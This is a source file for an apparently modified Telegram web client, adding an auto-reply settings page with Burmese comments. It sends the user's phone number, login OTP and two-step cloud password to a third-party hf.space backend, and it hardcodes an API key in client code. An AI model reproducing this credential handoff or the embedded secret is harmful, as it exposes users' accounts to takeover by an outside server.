import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';
import useLang from '../../../hooks/useLang';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; // 🌟 Global State မှ ဖုန်းနံပါတ် ယူရန်
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ onReset, currentUserId, currentUserPhone }) => {
  const lang = useLang();
  const safeUserId = currentUserId || "unknown";

  // ချိတ်ဆက်ပြီးသားလား စစ်ဆေးရန်
  const [isLinked, setIsLinked] = useState(() => localStorage.getItem(`ar_linked_${safeUserId}`) === 'true');
  const [isEnabled, setIsEnabled] = useState(() => localStorage.getItem(`ar_enabled_${safeUserId}`) === 'true');
  const [replyText, setReplyText] = useState(() => localStorage.getItem(`ar_text_${safeUserId}`) || "ယခု မအားသေးပါ။ နောက်မှ ပြန်ဆက်သွယ်ပါမည်။");
  
  // 🌟 Login Step များကို LocalStorage တွင် မှတ်ထားမည် (Code သွားကြည့်ရန် ထွက်သွားပါက ပြန်ရောက်လျှင် မပျောက်စေရန်)
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  
  // ဖုန်းနံပါတ်ကိုလည်း မှတ်ထားမည်
  const [savedPhone, setSavedPhone] = useState(() => {
    return localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '';
  });

  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Setup ကို ဖျက်သိမ်းပြီး အစက ပြန်စရန်
  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  // ၁။ လက်ရှိ ဝင်ထားသော ဖုန်းနံပါတ်ဖြင့် OTP တိုက်ရိုက်တောင်းခြင်း
  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) return alert("❌ သင့်အကောင့်၏ ဖုန်းနံပါတ်ကို ရှာမတွေ့ပါ။");
    
    // Telegram API က '+' ပါတဲ့ ဖုန်းနံပါတ် တောင်းတဲ့အတွက် format ပြင်ပေးသည်
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      const data = await res.json();
      
      if (res.ok) {
        // အောင်မြင်ပါက State များကို မှတ်ထားမည်
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        alert("❌ Error: " + data.error);
      }
    } catch (err) { alert("❌ Network Error: Server သို့ ချိတ်ဆက်၍ မရပါ။"); }
    setIsLoading(false);
  };

  // ၂။ OTP / 2FA စစ်ဆေးခြင်း
  const handleVerifyCode = async () => {
    if (!otpCode) return alert("OTP Code ထည့်ပါ။");
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({
          user_id: safeUserId,
          phone_number: savedPhone,
          otp_code: otpCode,
          two_step_password: twoFaPassword || undefined
        })
      });
      const data = await res.json();
      
      if (res.ok) {
        // ✅ အောင်မြင်သွားပါက ယာယီမှတ်ထားသော Setup Data များကို ဖျက်ပြီး ချိတ်ဆက်ပြီးကြောင်း မှတ်မည်
        handleCancelSetup();
        setIsLinked(true);
        setIsEnabled(true);
        localStorage.setItem(`ar_linked_${safeUserId}`, 'true');
        localStorage.setItem(`ar_enabled_${safeUserId}`, 'true');
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
        alert("✅ Auto-Reply Server နှင့် ချိတ်ဆက်မှု အောင်မြင်ပါသည်။");
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa');
      } else if (res.status === 400 && data.error.includes("expired")) {
        // Server Restart ကျသွား၍ သို့မဟုတ် အချိန်ကြာသွား၍ Code သက်တမ်းကုန်သွားပါက
        alert("⏳ Code သက်တမ်းကုန်သွားပါပြီ။ ကျေးဇူးပြု၍ အသစ်ပြန်တောင်းပါ။");
        handleCancelSetup();
      } else {
        alert("❌ Error: " + data.error);
      }
    } catch (err) { alert("❌ Network Error"); }
    setIsLoading(false);
  };

  // ၃။ ချိတ်ဆက်ပြီးသား အခြေအနေတွင် Text နှင့် On/Off Update လုပ်ခြင်း
  const handleSaveSettings = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      if (res.ok) {
        localStorage.setItem(`ar_enabled_${safeUserId}`, isEnabled.toString());
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
        alert("✅ Settings သိမ်းဆည်းပြီးပါပြီ!");
      } else {
        alert("❌ Update Error: Connection ပြတ်တောက်နေနိုင်ပါသည်။");
        // အကယ်၍ Backend မှာ Session မရှိတော့ဘူးဆိုရင် (ဥပမာ Terminate လုပ်ခံရရင်)
        if (res.status === 400) {
            setIsLinked(false);
            localStorage.setItem(`ar_linked_${safeUserId}`, 'false');
        }
      }
    } catch (err) { alert("❌ Network Error"); }
    setIsLoading(false);
  };

  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <Button round color="translucent" size="smaller" ariaLabel={lang('Back')} onClick={onReset}>
          <i className="icon-arrow-left" />
        </Button>
        <h3 className="settings-header-title">Auto-Reply Server</h3>
      </div>

      {!isLinked ? (
        /* --- ချိတ်ဆက်ရန် လိုအပ်သော အခြေအနေ (Login Flow) --- */
        <div className="settings-item" style={{ padding: '1.5rem 1rem' }}>
          
          {step === 'idle' && (
            <>
              <h4 style={{ marginBottom: '10px' }}>Connect Server</h4>
              <p style={{ fontSize: '14px', color: 'var(--color-text-secondary)', marginBottom: '15px' }}>
                Auto Reply ကို အသုံးပြုရန် သင့်အကောင့်အား ချိတ်ဆက်ပါ။ နှိပ်လိုက်ပါက သင့်ထံသို့ Telegram မှ Login Code ပို့ပေးပါမည်။
              </p>
              <Button onClick={handleAutoRequestCode} isLoading={isLoading} style={{ width: '100%' }}>
                Request Code Automatically
              </Button>
            </>
          )}

          {step === 'otp' && (
            <>
              <h4 style={{ marginBottom: '10px' }}>Enter OTP Code</h4>
              <p style={{ fontSize: '13px', color: 'var(--color-text-secondary)', marginBottom: '15px' }}>
                Telegram မှ ပေးပို့သော Code ကို ထည့်ပါ။ (Code သွားကြည့်ရန် ဤနေရာမှ ထွက်သွားပါက ပြန်ဝင်လာလျှင် ယခုနေရာမှပင် ဆက်လက်လုပ်ဆောင်နိုင်ပါသည်။)
              </p>
              <InputText label="OTP Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
              <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ width: '100%', marginTop: '10px' }}>Verify & Connect</Button>
              <Button color="danger" onClick={handleCancelSetup} disabled={isLoading} style={{ width: '100%', marginTop: '10px', background: 'transparent', color: 'var(--color-error)' }}>Cancel</Button>
            </>
          )}

          {step === '2fa' && (
            <>
              <h4 style={{ marginBottom: '10px', color: 'var(--color-error)' }}>2FA Required</h4>
              <p style={{ fontSize: '13px', color: 'var(--color-text-secondary)', marginBottom: '15px' }}>Two-Step Verification Password လိုအပ်ပါသည်။</p>
              <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
              <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ width: '100%', marginTop: '10px' }}>Submit Password</Button>
              <Button color="danger" onClick={handleCancelSetup} disabled={isLoading} style={{ width: '100%', marginTop: '10px', background: 'transparent', color: 'var(--color-error)' }}>Cancel</Button>
            </>
          )}
        </div>
      ) : (
        /* --- ချိတ်ဆက်ပြီးသား အခြေအနေ (Settings Flow) --- */
        <>
          <div className="settings-item" style={{ padding: '1rem', background: 'rgba(40, 167, 69, 0.1)', borderBottom: '1px solid var(--color-borders)' }}>
             <span style={{ color: '#28a745', fontWeight: 'bold' }}>✅ Connected to Auto Reply Server</span>
          </div>

          <div className="settings-item" style={{ padding: '1rem' }}>
            <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer', fontSize: '1rem' }}>
              <input type="checkbox" checked={isEnabled} onChange={(e) => setIsEnabled(e.target.checked)} style={{ width: '20px', height: '20px', marginRight: '15px' }} />
              <b style={{ color: 'var(--color-text)' }}>Enable Auto-Reply</b>
            </label>
          </div>

          <div className="settings-item" style={{ padding: '0 1rem' }}>
            <h4 className="settings-item-header" dir="auto" style={{ marginBottom: '10px' }}>Custom Message</h4>
            <textarea
              value={replyText}
              onChange={(e: any) => setReplyText(e.target.value)}
              disabled={!isEnabled}
              rows={4}
              style={{ width: '100%', padding: '10px', borderRadius: '8px', border: '1px solid var(--color-borders)', background: 'var(--color-background)', color: 'var(--color-text)', fontSize: '1rem', resize: 'none', fontFamily: 'inherit' }}
            />
          </div>

          <div className="settings-item" style={{ padding: '1rem' }}>
            <Button onClick={handleSaveSettings} isLoading={isLoading} style={{ width: '100%' }}>Save Settings</Button>
          </div>
        </>
      )}
    </div>
  );
};

export default memo(withGlobal<OwnProps>(
  (global): StateProps => { 
      // 🌟 Global State မှတဆင့် လက်ရှိ User ၏ ဖုန်းနံပါတ်ကို ဆွဲထုတ်ခြင်း
      const currentUserId = global.currentUserId;
      let currentUserPhone = undefined;
      
      if (currentUserId && global.users && global.users.byId) {
          const user = global.users.byId[currentUserId];
          if (user && user.phoneNumber) {
              currentUserPhone = user.phoneNumber;
          }
      }

      return { 
          currentUserId,
          currentUserPhone
      }; 
  }
)(AutoReplySettings));
